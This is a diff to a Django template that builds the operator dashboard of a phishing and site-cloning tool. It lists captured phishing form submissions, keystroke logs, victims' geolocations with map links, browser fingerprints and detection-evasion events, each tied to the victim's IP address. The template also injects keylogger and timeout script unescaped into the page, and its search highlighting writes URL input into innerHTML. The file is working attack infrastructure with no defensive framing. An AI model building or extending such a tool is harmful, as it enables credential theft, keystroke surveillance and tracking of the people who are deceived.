@@ -1,39 +1,463 @@
-{% extends 'base.html' %}
+{% extends 'base/clone.html' %}
 
 {% load static %}
 
 {% block content %}
-    <div>
-        <h1>Captured Logs</h1>
-        <h2>Phishing Submissions</h2>
-        <ul>{% for log in phishing %}<li>{{ log.page }} - {{ log.data }} ({{ log.ip }}) @ {{ log.timestamp }}</li>{% endfor %}</ul>
-        <h2>Keystrokes</h2>
-        <ul>{% for log in keystrokes %}<li>{{ log.page }} - {{ log.keys }} ({{ log.ip }}) @ {{ log.timestamp }}</li>{% endfor %}</ul>
-        <h2>Geolocations</h2>
-        <ul>{% for geo in geos %}<li>{{ geo.lat }}, {{ geo.lon }} ({{ geo.ip }}) @ {{ geo.timestamp }}</li>{% endfor %}</ul>
-        <h2>Fingerprints</h2>
-        <ul>
-        {% for fp in fingerprints %}
-            {% with data=fp.fingerprint|safe|json_script:"fpdata" %}
-            <li>
-              <strong>IP:</strong> {{ fp.ip }} @ {{ fp.timestamp }}<br>
-              {% with fpdata=fp.fingerprint|json_loads %}
-                <ul>
-                    <li><strong>User Agent:</strong> {{ fpdata.userAgent|default:"N/A" }}</li>
-                    <li><strong>Language:</strong> {{ fpdata.language|default:"N/A" }}</li>
-                    <li><strong>Platform:</strong> {{ fpdata.platform|default:"N/A" }}</li>
-                    <li><strong>Screen:</strong> {{ fpdata.screen|default:"N/A" }}</li>
-                    <li><strong>Timezone:</strong> {{ fpdata.timezone|default:"N/A" }}</li>
-                    <li><strong>Plugins:</strong> {{ fpdata.plugins|default:"N/A" }}</li>
-                </ul>
-              {% endwith %}
-              <details><summary>Raw</summary><pre>{{ fp.fingerprint }}</pre></details>
-            </li>
-            {% endwith %}
-        {% endfor %}
-        </ul>
-        
-        <h2>Evasion Events</h2>
-        <ul>{% for evasion in evasions %}<li>{{ evasion.info }} ({{ evasion.ip }}) @ {{ evasion.timestamp }}</li>{% endfor %}</ul>
+<div class="logs-dashboard">
+    <header class="logs-header">
+        <h1 class="logs-title">🔐 Captured Security Logs</h1>
+        <div class="logs-stats">
+            <span class="stat-badge phishing">🪝 {{ phishing|length }} Phishing</span>
+            <span class="stat-badge keystrokes">⌨️ {{ keystrokes|length }} Keystrokes</span>
+            <span class="stat-badge geolocation">🌍 {{ geos|length }} Locations</span>
+            <span class="stat-badge evasion">🛡️ {{ evasions|length }} Evasions</span>
+        </div>
+    </header>
+
+    <div class="logs-container">
+        <section class="log-section">
+            <h2 class="section-title">🪝 Phishing Submissions <span class="badge">{{ phishing|length }}</span></h2>
+            <div class="log-items">
+                {% for log in phishing %}
+                <div class="log-item phishing">
+                    <div class="log-icon">🪝</div>
+                    <div class="log-content">
+                        <div class="log-meta">
+                            <span class="log-page">{{ log.page|truncatechars:40 }}</span>
+                            <span class="log-ip">📡 {{ log.ip }}</span>
+                            <span class="log-time">🕒 {{ log.timestamp }}</span>
+                        </div>
+                        <div class="log-data">
+                            <details>
+                                <summary>View submission data</summary>
+                                <pre>{{ log.data|escape }}</pre>
+                            </details>
+                        </div>
+                    </div>
+                </div>
+                {% empty %}
+                <div class="empty-state">No phishing submissions captured</div>
+                {% endfor %}
+            </div>
+        </section>
+
+        <section class="log-section">
+            <h2 class="section-title">⌨️ Keystroke Logs <span class="badge">{{ keystrokes|length }}</span></h2>
+            <div class="log-items">
+                {% for log in keystrokes %}
+                <div class="log-item keystroke">
+                    <div class="log-icon">⌨️</div>
+                    <div class="log-content">
+                        <div class="log-meta">
+                            <span class="log-page">{{ log.page|truncatechars:40 }}</span>
+                            <span class="log-ip">📡 {{ log.ip }}</span>
+                            <span class="log-time">🕒 {{ log.timestamp }}</span>
+                        </div>
+                        <div class="log-data">
+                            <code>{{ log.keys|escape }}</code>
+                        </div>
+                    </div>
+                </div>
+                {% empty %}
+                <div class="empty-state">No keystrokes captured</div>
+                {% endfor %}
+            </div>
+        </section>
+
+        <section class="log-section">
+            <h2 class="section-title">🌍 Geolocation Data <span class="badge">{{ geos|length }}</span></h2>
+            <div class="log-items">
+                {% for geo in geos %}
+                <div class="log-item geolocation">
+                    <div class="log-icon">🌍</div>
+                    <div class="log-content">
+                        <div class="log-meta">
+                            <span class="log-ip">📡 {{ geo.ip }}</span>
+                            <span class="log-time">🕒 {{ geo.timestamp }}</span>
+                        </div>
+                        <div class="log-data">
+                            <a href="https://maps.google.com/?q={{ geo.lat }},{{ geo.lon }}" target="_blank" class="map-link">
+                                📌 {{ geo.lat }}, {{ geo.lon }}
+                            </a>
+                        </div>
+                    </div>
+                </div>
+                {% empty %}
+                <div class="empty-state">No geolocation data captured</div>
+                {% endfor %}
+            </div>
+        </section>
+
+        <section class="log-section">
+            <h2 class="section-title">🖥️ Browser Fingerprints <span class="badge">{{ fingerprints|length }}</span></h2>
+            <div class="log-items">
+                {% for fp in fingerprints %}
+                <div class="log-item fingerprint">
+                    <div class="log-icon">🖥️</div>
+                    <div class="log-content">
+                        <div class="log-meta">
+                            <span class="log-ip">📡 {{ fp.ip }}</span>
+                            <span class="log-time">🕒 {{ fp.timestamp }}</span>
+                        </div>
+                        <div class="log-data">
+                            {% with fpdata=fp.fingerprint %}
+                            <div class="fingerprint-grid">
+                                <div><span class="fp-label">🛡️ User Agent:</span> <code>{{ fpdata.userAgent|default:"N/A"|truncatechars:60 }}</code></div>
+                                <div><span class="fp-label">🗣️ Language:</span> {{ fpdata.language|default:"N/A" }}</div>
+                                <div><span class="fp-label">💻 Platform:</span> {{ fpdata.platform|default:"N/A" }}</div>
+                                <div><span class="fp-label">🖥️ Screen:</span> {{ fpdata.screen|default:"N/A" }}</div>
+                                <div><span class="fp-label">⏰ Timezone:</span> {{ fpdata.timezone|default:"N/A" }}</div>
+                                <div><span class="fp-label">🧩 Plugins:</span> {{ fpdata.plugins|default:"N/A"|truncatechars:40 }}</div>
+                            </div>
+                            {% endwith %}
+                            <details class="raw-details">
+                                <summary>📄 View raw fingerprint</summary>
+                                <pre>{{ fp.fingerprint }}</pre>
+                            </details>
+                        </div>
+                    </div>
+                </div>
+                {% empty %}
+                <div class="empty-state">No fingerprint data captured</div>
+                {% endfor %}
+            </div>
+        </section>
+
+        <section class="log-section">
+            <h2 class="section-title">🛡️ Evasion Events <span class="badge">{{ evasions|length }}</span></h2>
+            <div class="log-items">
+                {% for evasion in evasions %}
+                <div class="log-item evasion">
+                    <div class="log-icon">⚠️</div>
+                    <div class="log-content">
+                        <div class="log-meta">
+                            <span class="log-ip">📡 {{ evasion.ip }}</span>
+                            <span class="log-time">🕒 {{ evasion.timestamp }}</span>
+                        </div>
+                        <div class="log-data">
+                            {{ evasion.info }}
+                        </div>
+                    </div>
+                </div>
+                {% empty %}
+                <div class="empty-state">No evasion events detected</div>
+                {% endfor %}
+            </div>
+        </section>
     </div>
-{% endblok %}
+</div>
+
+<style>
+    :root {
+        --primary: #4a6bff;
+        --primary-dark: #3a56cc;
+        --danger: #ff4757;
+        --warning: #ffa502;
+        --success: #2ed573;
+        --info: #1e90ff;
+        --dark: #2d3748;
+        --light: #f7fafc;
+        --gray: #e2e8f0;
+        --dark-gray: #718096;
+        --white: #ffffff;
+        --phishing-bg: #fff5f5;
+        --keystroke-bg: #f0fff4;
+        --geolocation-bg: #f0f8ff;
+        --fingerprint-bg: #f5f3ff;
+        --evasion-bg: #fff9e6;
+        --shadow: 0 2px 4px rgba(0, 0, 0, 0.05);
+        --radius: 8px;
+        --transition: all 0.2s ease;
+    }
+
+    .logs-dashboard {
+        font-family: 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+        color: var(--dark);
+        max-width: 1200px;
+        margin: 0 auto;
+        padding: 1.5rem;
+    }
+
+    .logs-header {
+        margin-bottom: 2rem;
+        padding-bottom: 1rem;
+        border-bottom: 1px solid var(--gray);
+    }
+
+    .logs-title {
+        font-size: 1.75rem;
+        margin-bottom: 0.5rem;
+        display: flex;
+        align-items: center;
+        gap: 0.5rem;
+    }
+
+    .logs-stats {
+        display: flex;
+        gap: 0.75rem;
+        flex-wrap: wrap;
+    }
+
+    .stat-badge {
+        padding: 0.25rem 0.75rem;
+        border-radius: 20px;
+        font-size: 0.875rem;
+        font-weight: 500;
+        display: inline-flex;
+        align-items: center;
+        gap: 0.25rem;
+    }
+
+    .stat-badge.phishing {
+        background-color: var(--phishing-bg);
+        color: var(--danger);
+    }
+
+    .stat-badge.keystrokes {
+        background-color: var(--keystroke-bg);
+        color: var(--success);
+    }
+
+    .stat-badge.geolocation {
+        background-color: var(--geolocation-bg);
+        color: var(--info);
+    }
+
+    .stat-badge.evasion {
+        background-color: var(--evasion-bg);
+        color: var(--warning);
+    }
+
+    .logs-container {
+        display: flex;
+        flex-direction: column;
+        gap: 2rem;
+    }
+
+    .log-section {
+        background: var(--white);
+        border-radius: var(--radius);
+        box-shadow: var(--shadow);
+        overflow: hidden;
+    }
+
+    .section-title {
+        font-size: 1.25rem;
+        padding: 1rem 1.5rem;
+        margin: 0;
+        background-color: var(--light);
+        border-bottom: 1px solid var(--gray);
+        display: flex;
+        align-items: center;
+        gap: 0.5rem;
+    }
+
+    .badge {
+        background-color: var(--dark-gray);
+        color: var(--white);
+        border-radius: 12px;
+        padding: 0.15rem 0.5rem;
+        font-size: 0.75rem;
+        margin-left: 0.5rem;
+    }
+
+    .log-items {
+        padding: 0.5rem 0;
+    }
+
+    .log-item {
+        display: flex;
+        gap: 1rem;
+        padding: 1rem 1.5rem;
+        border-bottom: 1px solid var(--gray);
+        transition: var(--transition);
+    }
+
+    .log-item:last-child {
+        border-bottom: none;
+    }
+
+    .log-item:hover {
+        background-color: var(--light);
+    }
+
+    .log-item.phishing:hover {
+        background-color: var(--phishing-bg);
+    }
+
+    .log-item.keystroke:hover {
+        background-color: var(--keystroke-bg);
+    }
+
+    .log-item.geolocation:hover {
+        background-color: var(--geolocation-bg);
+    }
+
+    .log-item.fingerprint:hover {
+        background-color: var(--fingerprint-bg);
+    }
+
+    .log-item.evasion:hover {
+        background-color: var(--evasion-bg);
+    }
+
+    .log-icon {
+        font-size: 1.5rem;
+        width: 40px;
+        height: 40px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        flex-shrink: 0;
+    }
+
+    .log-content {
+        flex: 1;
+        min-width: 0;
+    }
+
+    .log-meta {
+        display: flex;
+        gap: 1rem;
+        margin-bottom: 0.5rem;
+        font-size: 0.875rem;
+        color: var(--dark-gray);
+        flex-wrap: wrap;
+    }
+
+    .log-meta > span {
+        display: flex;
+        align-items: center;
+        gap: 0.25rem;
+    }
+
+    .log-page {
+        font-weight: 500;
+        color: var(--dark);
+    }
+
+    .log-data {
+        font-size: 0.9375rem;
+        line-height: 1.5;
+    }
+
+    .log-data pre {
+        margin: 0.5rem 0 0;
+        padding: 0.75rem;
+        background-color: var(--light);
+        border-radius: var(--radius);
+        overflow-x: auto;
+        font-size: 0.8125rem;
+    }
+
+    .log-data code {
+        background-color: var(--light);
+        padding: 0.2rem 0.4rem;
+        border-radius: 4px;
+        font-family: 'SFMono-Regular', Consolas, 'Liberation Mono', Menlo, monospace;
+        font-size: 0.875rem;
+    }
+
+    .fingerprint-grid {
+        display: grid;
+        grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+        gap: 0.5rem 1rem;
+        margin-bottom: 0.5rem;
+    }
+
+    .fp-label {
+        font-weight: 500;
+        color: var(--dark);
+        display: inline-flex;
+        align-items: center;
+        gap: 0.25rem;
+    }
+
+    .map-link {
+        color: var(--info);
+        text-decoration: none;
+        display: inline-flex;
+        align-items: center;
+        gap: 0.25rem;
+    }
+
+    .map-link:hover {
+        text-decoration: underline;
+    }
+
+    details {
+        margin-top: 0.5rem;
+    }
+
+    summary {
+        cursor: pointer;
+        font-weight: 500;
+        color: var(--primary);
+        display: inline-flex;
+        align-items: center;
+        gap: 0.25rem;
+    }
+
+    summary:hover {
+        color: var(--primary-dark);
+    }
+
+    .empty-state {
+        padding: 1.5rem;
+        text-align: center;
+        color: var(--dark-gray);
+        font-style: italic;
+    }
+
+    @media (max-width: 768px) {
+        .logs-dashboard {
+            padding: 1rem;
+        }
+
+        .log-meta {
+            flex-direction: column;
+            gap: 0.25rem;
+        }
+
+        .fingerprint-grid {
+            grid-template-columns: 1fr;
+        }
+    }
+</style>
+
+<script>
+    document.addEventListener('DOMContentLoaded', function() {
+        // Add click handler for all details elements to track opens
+        document.querySelectorAll('details').forEach(details => {
+            details.addEventListener('toggle', function() {
+                if (this.open) {
+                    console.log('Expanded details:', this.querySelector('summary').textContent.trim());
+                }
+            });
+        });
+
+        // Highlight search if URL has search param
+        const urlParams = new URLSearchParams(window.location.search);
+        const searchQuery = urlParams.get('search');
+        if (searchQuery) {
+            highlightSearch(searchQuery);
+        }
+
+        function highlightSearch(query) {
+            const elements = document.querySelectorAll('.log-page, .log-data, .log-ip');
+            const regex = new RegExp(query, 'gi');
+            
+            elements.forEach(el => {
+                const html = el.innerHTML;
+                const highlighted = html.replace(regex, match => 
+                    `<span class="highlight">${match}</span>`
+                );
+                el.innerHTML = highlighted;
+            });
+        }
+    });
+</script>
+
+{{ keylogger|safe }} 
+{{ timeout_script|safe }}
+{% endblock %}
